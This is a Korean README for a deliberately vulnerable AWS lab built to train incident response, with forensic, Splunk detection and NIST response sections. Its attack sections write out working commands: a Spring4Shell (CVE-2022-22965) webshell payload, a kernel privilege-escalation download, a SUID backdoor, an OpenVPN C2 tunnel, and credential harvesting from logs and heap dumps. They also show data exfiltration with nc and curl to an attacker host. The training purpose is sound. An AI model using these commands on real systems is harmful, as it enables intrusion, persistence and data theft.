# 🛡️ Enterprise Security Monitoring & Incident Response Project

[![AWS](https://img.shields.io/badge/AWS-Terraform-orange.svg)](https://aws.amazon.com/)
[![Spring](https://img.shields.io/badge/Spring-2.6.2-green.svg)](https://spring.io/)
[![Splunk](https://img.shields.io/badge/Splunk-SIEM-blue.svg)](https://www.splunk.com/)
[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)

> **⚠️ 경고: 교육 목적 전용**
> 
> 이 프로젝트는 침해사고 대응 훈련을 위해 **의도적으로 취약하게 설계된** 엔터프라이즈 환경입니다.
> **실제 운영 환경에 배포하거나 공개 인터넷에 노출하지 마십시오.**

## 📋 목차

- [개요](#개요)
- [기능](#기능)
- [아키텍처](#아키텍처)
- [공격 시나리오](#공격-시나리오)
- [설치 방법](#설치-방법)
- [사용법](#사용법)
- [포렌식 분석](#포렌식-분석)
- [프로젝트 구조](#프로젝트-구조)
- [MITRE ATT&CK 매핑](#mitre-attck-매핑)
- [침해사고 대응](#침해사고-대응)
- [면책 조항](#면책-조항)

## 🎯 개요

실제 기업 환경을 재현한 AWS 기반 침해사고 대응 훈련 플랫폼입니다. Spring4Shell 취약점을 시작으로 다단계 공격 체인을 시뮬레이션하고, 디지털 포렌식 및 SIEM 기반 탐지 기법을 학습할 수 있습니다.

### 주요 특징

- **현실적인 인프라**: Terraform으로 구축한 엔터프라이즈급 AWS 환경
- **다단계 공격 체인**: 초기 침투 → 권한 상승 → 지속성 → 데이터 유출
- **완전한 격리**: VPC 기반 네트워크 세그먼테이션
- **실전 포렌식**: Windows/Linux 아티팩트 분석 실습
- **SIEM 통합**: Splunk 기반 실시간 위협 탐지
- **교육 중심**: MITRE ATT&CK 프레임워크 매핑 및 상세 문서화

## ✨ 기능

### 인프라 기능

- **AWS 리소스**: VPC, EC2 (Auto Scaling), RDS (Multi-AZ), ALB, NAT Gateway
- **네트워크 격리**: Public/Private/Database 서브넷 분리
- **보안 모니터링**: VPC Flow Logs, CloudWatch Logs, Splunk Universal Forwarder
- **IaC 관리**: Terraform 모듈화 구조로 재사용 가능

### 취약한 애플리케이션

- **차량 공유 서비스**: 예약, 결제, 사용자 관리 기능
- **Spring4Shell 취약점**: CVE-2022-22965 (RCE)
- **PG API 연동**: 결제 게이트웨이 시뮬레이션 (로그에 API 키 노출)
- **민감 정보 저장**: 데이터베이스 크레덴셜, IAM Role

### 보안 테스트 기능

- **초기 침투**: Spring4Shell 웹쉘 생성
- **권한 상승**: GameOver(lay) 커널 취약점
- **지속성**: OpenVPN 터널, Cron 백도어, SUID 바이너리
- **데이터 유출**: VPN 터널을 통한 암호화 전송
- **포렌식 실습**: MFT, Event Logs, Registry, Prefetch 분석

## 🏗️ 아키텍처

### 네트워크 토폴로지

```
Internet
    │
    ▼
┌───────────────────────────────────────────────────────────────┐
│                     VPC (10.0.0.0/16)                          │
├───────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌──────────────────┐         ┌──────────────────┐           │
│  │ Public Subnet    │         │ Public Subnet    │           │
│  │ (10.0.1.0/24)    │         │ (10.0.2.0/24)    │           │
│  │ AZ-1             │         │ AZ-2             │           │
│  ├──────────────────┤         ├──────────────────┤           │
│  │ - ALB            │         │ - NAT Gateway    │           │
│  │ - Bastion Host   │         │ - Internet GW    │           │
│  └────────┬─────────┘         └─────────┬────────┘           │
│           │                             │                     │
│           │ ┌───────────────────────────┘                     │
│           ▼ ▼                                                 │
│  ┌─────────────────────────────────────────────┐             │
│  │      Private Subnet (10.0.10.0/24)          │             │
│  │              (격리된 영역)                    │             │
│  ├─────────────────────────────────────────────┤             │
│  │  ┌──────────────┐    ┌──────────────┐      │             │
│  │  │  Web EC2 #1  │    │  Web EC2 #2  │      │             │
│  │  │ (취약 앱)     │    │ (취약 앱)     │      │             │
│  │  ├──────────────┤    ├──────────────┤      │             │
│  │  │ Spring 2.6.2 │    │ Spring 2.6.2 │      │             │
│  │  │ Tomcat 9.0   │    │ Tomcat 9.0   │      │             │
│  │  │ JDK 17       │    │ JDK 17       │      │             │
│  │  │ Splunk UF    │    │ Splunk UF    │      │             │
│  │  └──────┬───────┘    └──────┬───────┘      │             │
│  │         │                    │              │             │
│  └─────────┼────────────────────┼──────────────┘             │
│            │                    │                             │
│  ┌─────────▼────────────────────▼──────────┐                 │
│  │   Database Subnet (10.0.20.0/24)        │                 │
│  │          (완전 격리 영역)                 │                 │
│  ├──────────────────────────────────────────┤                 │
│  │         ┌────────────────┐               │                 │
│  │         │  RDS MySQL 8.0 │               │                 │
│  │         │   (Multi-AZ)   │               │                 │
│  │         ├────────────────┤               │                 │
│  │         │ 자동 백업 활성화 │               │                 │
│  │         │ 암호화 활성화    │               │                 │
│  │         └────────────────┘               │                 │
│  └──────────────────────────────────────────┘                 │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 트래픽 흐름

**인바운드 (사용자 → 애플리케이션)**
```
사용자
  ↓
Internet Gateway (인터넷 진입점)
  ↓
Application Load Balancer (Public Subnet)
  ↓
Web EC2 Instances (Private Subnet)
  ↓
RDS MySQL (Database Subnet - 완전 격리)
```

**아웃바운드 (EC2 → 인터넷)**
```
Web EC2 (Private Subnet)
  ↓
NAT Gateway (Public Subnet)
  ↓
Internet Gateway
  ↓
외부 인터넷 (PG API, OpenVPN C2 서버 등)
```

### 컨테이너 상세

**Web EC2 (Auto Scaling Group)**
- AMI: Custom Ubuntu 22.04 (Spring4Shell 취약 버전)
- 인스턴스 타입: t3.medium
- Java: OpenJDK 17
- Spring Boot: 2.6.2 (취약 버전)
- Tomcat: 9.0.62
- 보안 그룹: ALB에서만 인바운드 허용 (포트 8080)

**RDS MySQL**
- 엔진: MySQL 8.0.43
- 인스턴스 클래스: db.t3.micro
- Multi-AZ: 활성화 (고가용성)
- 백업: 자동 백업 7일 보관
- 암호화: KMS 암호화 활성화
- 보안 그룹: Web EC2에서만 접근 허용 (포트 3306)

**Splunk Enterprise** (권장: 별도 VPC)
- Splunk Indexer + Search Head
- Universal Forwarder: 각 EC2에 설치
- 로그 수집: /var/log/spring-app, /var/log/tomcat9, /var/log/auth.log
- 포트: 9997 (Forwarder), 8000 (Web UI)

## 🔓 공격 시나리오

### 전체 공격 체인

```
1단계: 초기 침투             2단계: 권한 상승
   (Initial Access)          (Privilege Escalation)
        │                            │
        ▼                            ▼
Spring4Shell 웹쉘         GameOver(lay) 커널 취약점
CVE-2022-22965           CVE-2023-2640/32629
        │                            │
        └────────────┬───────────────┘
                     │
                     ▼
            3단계: 지속성 확보
               (Persistence)
                     │
        ┌────────────┼────────────┐
        │            │            │
        ▼            ▼            ▼
   OpenVPN       Cron Job     SUID 백도어
    터널링       리버스 쉘     /tmp/.hidden_shell
        │            │            │
        └────────────┼────────────┘
                     │
        ┌────────────┴────────────┐
        │                         │
        ▼                         ▼
   4단계: 정찰            5단계: 크레덴셜 수집
   (Discovery)          (Credential Access)
        │                         │
        ▼                         ▼
  시스템 정보 수집         로그/메모리에서 API 키 추출
  네트워크 구성 파악       RDS 크레덴셜 탈취
        │                         │
        └────────────┬────────────┘
                     │
                     ▼
            6단계: 데이터 유출
              (Exfiltration)
                     │
        ┌────────────┼────────────┐
        │            │            │
        ▼            ▼            ▼
  로그 파일      메모리 덤프    DB 데이터
  압축 전송      힙 덤프 전송    SQL 덤프
```

### 1. Spring4Shell 웹쉘 생성

**취약점**: CVE-2022-22965  
**대상**: Spring Framework 5.3.0~5.3.17, JDK 9+, Tomcat

**익스플로잇**:

```bash
# 1단계: 취약점 스캔
curl -X GET "http://<ALB-DNS>/greeting" \
  -H "suffix: %>//" \
  -H "c1: Runtime" \
  -H "c2: <%"

# 2단계: 웹쉘 생성
curl -X POST "http://<ALB-DNS>/greeting" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if('j'.equals(request.getParameter('pwd'))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter('cmd')).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{c1}i" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# 3단계: 웹쉘 접근
curl "http://<ALB-DNS>/shell.jsp?pwd=j&cmd=whoami"
```

**생성된 아티팩트**:
- `/usr/share/tomcat9/webapps/ROOT/shell.jsp` (웹쉘)
- Tomcat Access Log (악의적 패턴)

**탐지 지표 (IOC)**:
```
파일: shell.jsp
로그 패턴: "class.module.classLoader.resources.context.parent.pipeline"
```

---

### 2. GameOver(lay) 권한 상승

**취약점**: CVE-2023-2640 + CVE-2023-32629  
**대상**: Ubuntu 22.04 LTS (Kernel 5.15~6.2)

**익스플로잇**:

```bash
# 1단계: PoC 다운로드
cd /tmp
wget https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
chmod +x exploit.sh

# 2단계: 권한 상승 실행
./exploit.sh

# 3단계: Root 쉘 확인
whoami  # 출력: root

# 4단계: 영구 SUID 백도어 설치
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell
```

**생성된 아티팩트**:
- `/tmp/exploit.sh`
- `/tmp/.hidden_shell` (SUID 백도어)

---

### 3. OpenVPN 아웃바운드 터널

**목적**: 암호화된 C2 통신 채널 구축

**익스플로잇**:

**공격자 PC (OpenVPN 서버 구성)**:
```bash
# OpenVPN 서버 설치 및 구성
sudo apt install openvpn easy-rsa -y
# ... (PKI 구성 생략)
sudo systemctl start openvpn@server
```

**침투된 EC2 (OpenVPN 클라이언트 설치)**:
```bash
# OpenVPN 클라이언트 설치
apt install openvpn -y

# 클라이언트 설정 다운로드
wget http://123.45.67.89:8080/client.ovpn -O /etc/openvpn/client/client.ovpn

# 터널 연결
openvpn --config /etc/openvpn/client/client.ovpn --daemon

# Systemd 서비스로 지속성 확보
systemctl enable openvpn-client
systemctl start openvpn-client
```

**생성된 아티팩트**:
- `/etc/openvpn/client/client.ovpn`
- `/etc/systemd/system/openvpn-client.service`

**탐지 지표 (IOC)**:
```
네트워크: UDP 1194 아웃바운드
프로세스: /usr/sbin/openvpn --daemon
인터페이스: tun0
```

---

### 4. PG API 키 탈취

**익스플로잇**:

```bash
# 애플리케이션 로그에서 API 키 추출
grep -r "test_sk_\|Authorization" /var/log/spring-app/

# Java 메모리 덤프
JAVA_PID=$(pgrep -f 'java.*spring')
jmap -dump:format=b,file=/tmp/heap.bin $JAVA_PID

# 힙 덤프에서 민감 정보 추출
strings /tmp/heap.bin | grep -i "password\|secret\|key" > /tmp/credentials.txt
```

**탈취된 정보**:
```
API_KEY: test_sk_zXyW9v8u7T6s5R4q3P2o1N0m
MERCHANT_ID: tosspayments_hyundai_carsharing
DB_PASSWORD: SuperSecretPassword123!
```

---

### 5. 데이터 유출

**방법 1: VPN 터널을 통한 전송**:
```bash
# 공격자 PC
nc -lvp 4444 > exfiltrated-data.tar.gz

# 침투된 EC2
tar -czf - /var/log/spring-app | nc 10.8.0.1 4444
```

**방법 2: HTTP POST 업로드**:
```bash
# 공격자 PC
python3 -m uploadserver 8080

# 침투된 EC2
tar -czf /tmp/data.tar.gz /var/log/spring-app
curl -X POST -F "file=@/tmp/data.tar.gz" http://10.8.0.1:8080/upload
```

**유출된 데이터**:
- 애플리케이션 로그 (50MB)
- Java 힙 덤프 (500MB)
- 데이터베이스 덤프 (200MB)
- AWS 크레덴셜

---

## 🚀 설치 방법

### 사전 요구사항

- AWS 계정
- Terraform >= 1.0
- AWS CLI
- Git

### 빠른 시작

```bash
# 1. 저장소 클론
git clone https://github.com/your-repo/enterprise-security-project.git
cd enterprise-security-project

# 2. AWS CLI 구성
aws configure

# 3. Terraform 변수 설정
cd infrastructure/terraform
cp terraform.tfvars.example terraform.tfvars
vim terraform.tfvars

# 4. 인프라 배포
terraform init
terraform plan
terraform apply

# 5. 출력 확인
terraform output
```

**terraform.tfvars 필수 설정**:
```hcl
project_name = "WALB"
vpc_cidr     = "10.0.0.0/16"
db_password  = "YourSecurePassword123!"  # 필수 변경!
web_ami_id   = "ami-073b2e8f97b4da8bd"
```

### Splunk 설정 (선택)

```bash
# Bastion을 통해 Web EC2 접속
ssh -i key.pem -J ec2-user@<BASTION-IP> ec2-user@10.0.10.50

# Universal Forwarder 설치
wget -O splunkforwarder.tgz "https://download.splunk.com/..."
sudo tar xvzf splunkforwarder.tgz -C /opt

# Splunk Forwarder 시작
sudo /opt/splunkforwarder/bin/splunk start --accept-license

# Indexer 연결
sudo /opt/splunkforwarder/bin/splunk add forward-server <SPLUNK-IP>:9997

# 모니터링 경로 추가
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/spring-app/
```

---

## 📖 사용법

### 공격 시나리오 실습

**시나리오 1: Spring4Shell 초기 침투**

```bash
# Spring4Shell 익스플로잇 실행
cd scripts/
python3 spring4shell_exploit.py --url http://<ALB-DNS>/greeting --cmd "id"

# 리버스 쉘 획득
python3 spring4shell_exploit.py --url http://<ALB-DNS>/greeting --reverse-shell <IP>:4444
```

**시나리오 2: 권한 상승 및 지속성**

```bash
# 권한 상승
./exploit.sh

# SUID 백도어
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell

# OpenVPN 클라이언트
apt install openvpn -y
openvpn --config client.ovpn --daemon
```

**시나리오 3: 데이터 유출**

```bash
# API 키 추출
grep -r "test_sk_" /var/log/spring-app/ > /tmp/api-keys.txt

# 메모리 덤프
jmap -dump:format=b,file=/tmp/heap.bin $(pgrep java)

# 데이터 압축 및 전송
tar -czf /tmp/exfil.tar.gz /var/log/spring-app
cat /tmp/exfil.tar.gz | nc 10.8.0.1 4444
```

---

## 🔍 포렌식 분석

### 증거 수집 절차

**휘발성 데이터**:
```bash
sudo netstat -antp > /forensics/network.txt
sudo ps auxf > /forensics/processes.txt
sudo insmod lime.ko "path=/forensics/memory.lime format=lime"
```

**비휘발성 데이터 (AWS)**:
```bash
# EBS 스냅샷 생성
aws ec2 create-snapshot --volume-id vol-xxxxx \
  --description "Forensic Evidence $(date +%Y%m%d)"

# CloudWatch Logs 다운로드
aws logs filter-log-events \
  --log-group-name /aws/ec2/spring-app \
  --start-time $(date -d '2 hours ago' +%s)000 > logs.json
```

### 아티팩트 분석

**파일 시스템 타임라인**:
```bash
# Sleuth Kit 사용
fls -r -m / /forensics/evidence.img > body.txt
mactime -b body.txt -d > timeline.csv

# 의심 파일 필터링
grep "shell\.jsp\|\.hidden_shell\|openvpn" timeline.csv
```

**로그 분석**:
```bash
# Tomcat Access Log
grep "class\.module\.classLoader" /var/log/tomcat9/*.log

# Auth.log
grep -E "sudo|COMMAND=" /var/log/auth.log

# Spring Application Log
grep -E "Authorization|API_KEY" /var/log/spring-app/*.log
```

**VPC Flow Logs**:
```
# Splunk 쿼리
index=vpc_flow_logs dstPort=1194 protocol="UDP"
| stats sum(bytes) by srcAddr, dstAddr
```

### 타임라인 재구성

| 시간 | 이벤트 | 아티팩트 | ATT&CK |
|------|--------|----------|--------|
| 10:05:45 | 웹쉘 생성 | shell.jsp | T1505.003 |
| 10:10:33 | 권한 상승 | exploit.sh | T1068 |
| 10:15:01 | OpenVPN 설치 | client.ovpn | T1543.002 |
| 10:25:17 | API 키 추출 | application.log | T1552.001 |
| 10:42:15 | 데이터 유출 | VPC Flow Logs | T1041 |

---

## 📁 프로젝트 구조

```
enterprise-security-project/
├── README.md
├── infrastructure/
│   └── terraform/
│       ├── main.tf
│       ├── variables.tf
│       └── modules/
│           ├── vpc/
│           ├── ec2/
│           └── rds/
├── application/
│   └── spring4shell-test/
│       ├── src/
│       └── pom.xml
├── scripts/
│   ├── attack/
│   │   ├── spring4shell_exploit.py
│   │   └── gameover_privesc.sh
│   ├── forensics/
│   │   └── evidence_collection.sh
│   └── detection/
│       └── splunk_alerts.spl
├── docs/
│   ├── AWS_Infra.md
│   └── INCIDENT_RESPONSE_REPORT.md
└── forensics/
    └── tools/
```

---

## 🎯 MITRE ATT&CK 매핑

| 전술 | 기법 ID | 기법 명 | 설명 |
|------|---------|---------|------|
| Initial Access | T1190 | Exploit Public-Facing Application | Spring4Shell 웹 취약점 |
| Execution | T1059.004 | Unix Shell | 웹쉘 명령 실행 |
| Persistence | T1543.002 | Systemd Service | OpenVPN 서비스 등록 |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | GameOver(lay) 커널 취약점 |
| Credential Access | T1552.001 | Credentials In Files | 로그에서 API 키 추출 |
| Collection | T1005 | Data from Local System | 로그/DB 수집 |
| Command and Control | T1572 | Protocol Tunneling | OpenVPN 터널 |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | VPN으로 데이터 유출 |

---

## 🛡️ 침해사고 대응

### NIST SP 800-61 기반 대응

**1. 준비 (Preparation)**
- 대응팀 구성, 도구 준비, 정책 수립

**2. 탐지 및 분석 (Detection & Analysis)**

Splunk 탐지 규칙:
```spl
# Spring4Shell 공격 탐지
index=tomcat sourcetype=catalina_log
| rex field=_raw "class\.module\.classLoader"
| stats count by src_ip, uri
```

**3. 격리 (Containment)**
```bash
# 아웃바운드 차단
aws ec2 revoke-security-group-egress --group-id sg-xxxxx

# Auto Scaling 중단
aws autoscaling suspend-processes --auto-scaling-group-name WALB-asg
```

**4. 제거 (Eradication)**
```bash
# 악성 프로세스 종료
sudo pkill -9 openvpn

# 백도어 제거
sudo rm -f /usr/share/tomcat9/webapps/ROOT/shell.jsp
sudo rm -f /tmp/.hidden_shell

# 패치 적용
sudo apt upgrade -y linux-generic
```

**5. 복구 (Recovery)**
```bash
# 깨끗한 AMI로 새 인스턴스 배포
terraform apply -var="web_ami_id=ami-patched"

# 크레덴셜 로테이션
aws rds modify-db-instance --master-user-password "NewPassword!"
```

**6. 사후 활동 (Post-Incident)**
- 침해사고 보고서 작성
- 경영진 브리핑
- 재발 방지 대책 수립

### IOC (Indicators of Compromise)

**네트워크 IOC**:
```
C2 서버 IP: 123.45.67.89
OpenVPN 포트: UDP 1194
대용량 트래픽: 500MB+
```

**파일 시스템 IOC**:
```
/usr/share/tomcat9/webapps/ROOT/shell.jsp
/tmp/.hidden_shell
/tmp/heap.bin
/etc/openvpn/client/client.ovpn
```

**프로세스 IOC**:
```
openvpn --daemon
bash -i >& /dev/tcp/...
nc 10.8.0.1 4444
```

---

## ⚖️ 면책 조항

**이 소프트웨어는 교육 목적으로만 제공됩니다**

- 의도적인 보안 취약점 포함
- 실제 운영 환경 배포 금지
- 공개 인터넷 노출 금지
- 악의적 사용 금지

이 소프트웨어를 사용함으로써 다음에 동의합니다:
- 격리된 AWS 환경에서만 사용
- 명시적 허가 없이 제3자 시스템 테스트 금지
- 모든 관련 법률 준수
- 저작자에게 책임 청구 불가

---

## 📚 학습 자료

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **MITRE ATT&CK**: https://attack.mitre.org/
- **AWS Security**: https://docs.aws.amazon.com/security/
- **SANS DFIR**: https://www.sans.org/

---

## 👥 프로젝트 정보

| 항목 | 내용 |
|------|------|
| **팀** | Team 2 |
| **환경** | Development |
| **인프라** | AWS (Terraform) |
| **애플리케이션** | Spring Boot 2.6.2 |
| **SIEM** | Splunk Enterprise |
| **기간** | 2025.10 ~ 2025.12 |

---
